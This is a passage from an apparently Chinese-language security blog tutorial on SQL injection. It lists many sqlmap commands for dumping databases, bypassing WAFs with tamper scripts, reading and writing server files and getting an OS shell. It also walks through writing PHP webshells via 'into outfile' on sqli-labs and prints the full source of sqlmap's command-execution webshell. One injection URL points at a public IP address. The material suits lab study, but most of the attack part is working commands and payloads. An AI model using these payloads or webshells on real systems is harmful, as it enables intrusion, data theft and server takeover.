#爆出security数据库中users表中的所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --dump-all   #爆出数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dump-all  #爆出该数据库中的所有数据</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/test.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbms=&quot;MySQL&quot;     #指定其数据库为mysql </span><br><span class="line">其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, sqli-labste, Sybase, Vertica, eXtremeDB</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --random-agent   #使用任意的User-Agent爆破</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;    #指定代理</span><br><span class="line">当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span><br><span class="line">支持的探测方式如下：</span><br><span class="line">　　B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">　　E: Error-based SQL injection（报错型注入）</span><br><span class="line">　　U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">　　S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">　　T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">  </span><br><span class="line">sqlmap -d &quot;mysql://root:root@127.0.0.130:3306/mysql&quot; --os-shell   #知道网站的账号密码直接连接</span><br><span class="line"> </span><br><span class="line">-v3                   #输出详细度  最大值5 会显示请求包和回复包</span><br><span class="line">--threads 5           #指定线程数</span><br><span class="line">--fresh-queries       #清除缓存</span><br><span class="line">--flush-session       #清空会话，重构注入 </span><br><span class="line">--batch               #对所有的交互式的都是默认的</span><br><span class="line">--random-agent        #任意的http头</span><br><span class="line">--tamper base64encode            #对提交的数据进行base64编码</span><br><span class="line">--referer http://www.baidu.com   #伪造referer字段</span><br><span class="line"> </span><br><span class="line">--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>只用–tamper对参数进行修改来绕过waf，官方提供的绝大部分脚本是用正则模块替换攻击载荷字符编码的方式来绕过waf的检测规则。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--identify-waf   检测是否有WAF</span><br><span class="line"> </span><br><span class="line">#使用参数进行绕过</span><br><span class="line">--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span><br><span class="line">--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时</span><br><span class="line">--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span><br><span class="line">--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过</span><br><span class="line">--ignore-proxy    禁止使用系统的代理，直接连接进行注入</span><br><span class="line">--flush-session   清空会话，重构注入</span><br><span class="line">--hex 或者 --no-cast     进行字符码转换</span><br><span class="line">--mobile          对移动端的服务器进行注入</span><br><span class="line">--tor             匿名注入</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sqlmap为我们准备了绕过waf的脚本，在sqlmap文件夹tamper文件夹下<br>使用情况如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用方法--tamper xxx.py</span><br><span class="line">apostrophemask.py用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="level-risk"><a href="#level-risk" class="headerlink" title="-level&#x2F;-risk"></a>-level&#x2F;-risk</h3><p>Sqlmap一共有5个探测等级,默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多 ，会自动破解出cookie、XFF等头部注入。当然,等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试,HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。 在不确定哪个参数为注入点时，为为保证准确.性,建议设置level为5</p>
<p>Sqlmap一共有3个危险等级, 也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思， 在不确定的情况下，建议设置为3级，–risk&#x3D;3</p>
<p>工具使用payload目录<br>sqlmap\data\xml\payloads（windows）</p>
<p>伪造Http Referer头部<br>sqlmap可以在请求中伪造http请求头中的referer，当-level大于等于3时，会进行referer注入<br>eg: referer <code>http://www.topreverse.cn</code></p>
<h3 id="执行指定的SQL语句"><a href="#执行指定的SQL语句" class="headerlink" title="执行指定的SQL语句"></a>执行指定的SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605e43b6e.png" alt="image-20240309202957671"></p>
<h3 id="执行OS系统命令"><a href="#执行OS系统命令" class="headerlink" title="执行OS系统命令"></a>执行OS系统命令</h3><p>当且仅当数据库是mysql、postgresql、sql server时可以执行。<br>当数据库是mysql时，需要满足3个条件：<br>1、root权限<br>2、已经知道目标站点的绝对路径<br>3、secure_file_priv的参数值时空（未修改前是NULL）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell  #执行--os-shell命令</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605df3431.png" alt="image-20240309203114502"></p>
<p>过程中sqlmap会向指定路径传入两个文件，tmpblwkd.php（木马文件）和tmpueqch.php。退出时输入q和x才可以删除传入的文件。</p>
<h3 id="读取服务器文件"><a href="#读取服务器文件" class="headerlink" title="读取服务器文件"></a>读取服务器文件</h3><p>前提：数据库是：mysql、postgresql和sql server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/topreverse.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br></pre></td></tr></table></figure>

<p>上传文件到数据库服务器<br>前提：数据库是mysql、postgre sql、sql server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-2/?id=1 --file-write C:\Users\system32\Desktop\text.php --file-dest &quot;C:\phpStudy\PHPTutorial\WWW\test.php&quot;  #将本地的text.php文件上传到目标服务器test.php</span><br></pre></td></tr></table></figure>

<p>sqlmap自身上传完成之后会进行验证，读取文件大小进行对比。</p>
<h1 id="SQL写马"><a href="#SQL写马" class="headerlink" title="SQL写马"></a>SQL写马</h1><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><h4 id="1-此方法利用的先决条件"><a href="#1-此方法利用的先决条件" class="headerlink" title="1.此方法利用的先决条件"></a>1.此方法利用的先决条件</h4><ul>
<li><p>web目录具有写权限，能够使用单引号</p>
</li>
<li><p>知道网站绝对路径（根目录，或则是根目录往下的目录都行）</p>
</li>
<li><p>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</p>
</li>
<li><p>最好网站是root权限</p>
</li>
</ul>
<h4 id="2-secure-file-priv"><a href="#2-secure-file-priv" class="headerlink" title="2.secure_file_priv"></a>2.secure_file_priv</h4><p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。如下关于secure_file_priv的配置介绍</p>
<p><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</code></p>
<p>所以如果我们要想使用into outfile函数写入一句话的话就需要将secure_file_priv 的值设为没有值，那如何设置了？修改secure_file_priv 的值只能通过手动打开配置文件进行修改，不能直接使用sql语句进行修改</p>
<p>（1）看secure-file-priv参数的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>


<p>如下，secure_file_priv 的值默认为NULL，则表示限制mysqld 不允许导入|导出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b1980f.png" alt="image-20240309213850241"></p>
<p>（2）修改secure_file_priv 的值</p>
<p>我们可以在mysql&#x2F;my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv &#x3D; ‘’ 即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605abbc58.png" alt="image-20240309213819001"></p>
<p>此时再查看secure_file_priv的值如下已经变为空了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605a6d4e7.png" alt="image-20240309213241536"></p>
<p>设置完成后我们就可以利用这个函数来写入一句话木马</p>
<p><strong>outfile还有一个”兄弟”时dumpfile</strong> </p>
<p>两者的区别是dumpfile只能导出一行，而outfile支持多行，dumpfile保留数据的原始格式未进行转义，而outfile会对数据进行转义</p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>我们以sqli-labs第七关为例</p>
<h4 id="1-注入点判断"><a href="#1-注入点判断" class="headerlink" title="1.注入点判断"></a>1.注入点判断</h4><p>输入正确的语法正常显示，错误的语法显示说语法错误，页面只存在两种状态，判断为盲注。我们输入?id&#x3D;3’)) and sleep(5) –+时成功延时，所以注入点就为3’))，我们输入的字符被包含在单引号中，且单引号外有两个双引号包裹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cc6295.png" alt="image-20240309212953403"></p>
<h4 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h4><p>我们使用order by 语句判断列数，order by 3时，正常显示，4时不正常，判断为3列</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ce5806.png" alt="image-20240309212923779"></p>
<h4 id="3-写入webshell"><a href="#3-写入webshell" class="headerlink" title="3.写入webshell"></a>3.写入webshell</h4><p>加如此前我们已经通过一些方法获取到了网站的根目录，则可以写入一句话 “ <code>&lt;?php eval($_REQUEST[1]);?&gt; </code>”。一句话建议进行十六进制转码（不用编码也可以） </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605abe0b1.png" alt="image-20240309212843043"></p>
<p>编码后，然后在最前面加上 0x。如下我们将一句话木马进行十六进制编码后写入了根目录下的outfile.php文件中</p>
<p><code>http://106.15.50.112:8023/?r=content&amp;cid=-1%20and(1)UNION SELECT 1,2,3,4,5,6,7,8,9,10,&lt;?php @eval($_REQUEST[&#39;aaa&#39;]);?&gt;,12,13 into outfile &quot;/var/www/html/aaa.php&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-3&#x27;)) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;C:\\Users\\Administrator.WIN2012\\Desktop\\ph</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605e15d6c.png" alt="image-20240309212821210"></p>
<p>成功写入，<strong>这里网站的目录要使用双斜杠</strong>不然会写不进去，第一个斜杠是转义的意思，字符串解析不仅仅局限于C编译器，Java编译器、一些配置文件的解析、Web服务器等等，都会遇到对字符串进行解析的这个问题，由于传统的 Windows采用的是单个斜杠的路径分隔形式，导致在对文件路径进行解析的时候可能发生不必要的错误，所以就出现了用双反斜杠”\“分隔路径的形式。 不管解析引擎是否将反斜杠解析成转义字符，最终在内存中得到的都是”&quot;，结果也就不会出问题了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ae93b5.png" alt="image-20240309212740673"></p>
<h4 id="4-连接webshell"><a href="#4-连接webshell" class="headerlink" title="4.连接webshell"></a>4.连接webshell</h4><p>成功连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b91e13.png" alt="image-20240309212708078"></p>
<p>如果我们将 secure_file_priv的值为设置为null，我们在进行上面的写入操作发现并没有写进去。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605ac4c04.png" alt="image-20240309212649362"></p>
<p>所以没有写进去的情况有两种：</p>
<ul>
<li>网站的路径不对，或者没有使用双斜杠进行转义</li>
<li>secure_file_priv的值不是为空</li>
</ul>
<h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件</p>
<p>此为sqlmap的一个命令，利用这条命令的先决条件：</p>
<p>要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba<br>secure_file_priv没有具体值<br>知道网站的绝对路径</p>
<h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p>我们以sqli-labs第一关为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure>


<p>这里需要我们选择网站的脚本语言，和网站根路径</p>
<p>[1] common location(s) (‘C:&#x2F;xampp&#x2F;htdocs&#x2F;, C:&#x2F;wamp&#x2F;www&#x2F;, C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;‘) (default) #sqlmap自带测试常规路径<br>[2] custom location(s) #自己填写绝对路径<br>[3] custom directory list file #自己填写目录字典，我们将字典所在的路径传过去就行<br>[4] brute force search #爆破路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605e0acb5.png" alt="image-20240309212513030"></p>
<p>sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）：</p>
<p>tmpbeewq.php 用来执行系统命令<br>tmpuqvgw.php 用来上传文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605abcf3b.png" alt="image-20240310123947689"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d631d1.png" alt="image-20240309212253989"></p>
<ol>
<li>tmpbeewq.php的文件内容为</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);<span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))&#123;<span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);<span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$z</span>=<span class="keyword">array</span>();&#125;<span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;<span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);&#125;@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;<span class="title function_ invoke__">ob_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;<span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);<span class="variable">$w</span>=<span class="literal">NULL</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))&#123;<span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);&#125;&#125;@<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">array</span>();<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);<span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$w</span>=<span class="number">0</span>;&#125;<span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>访问一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b8678b.png" alt="image-20240309212158771"></p>
<ol start="2">
<li>使用tmpuqvgw.php上传文件</li>
</ol>
<p>我们上传一个php的一句话后门</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605c9578c.png" alt="image-20240309212059564"></p>
<p>访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d2de48.png" alt="image-20240309212338071"></p>
<p><strong>所以这两种方式都需要知道网站的绝对路径才行。</strong></p>
<p>补充：</p>
<p>上面说了sqlmap写入webshell的方式有三种，缺一不可</p>
<ul>
<li>web目录具有写权限，能够使用单引号</li>
<li>知道网站绝对路径</li>
<li>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</li>
</ul>
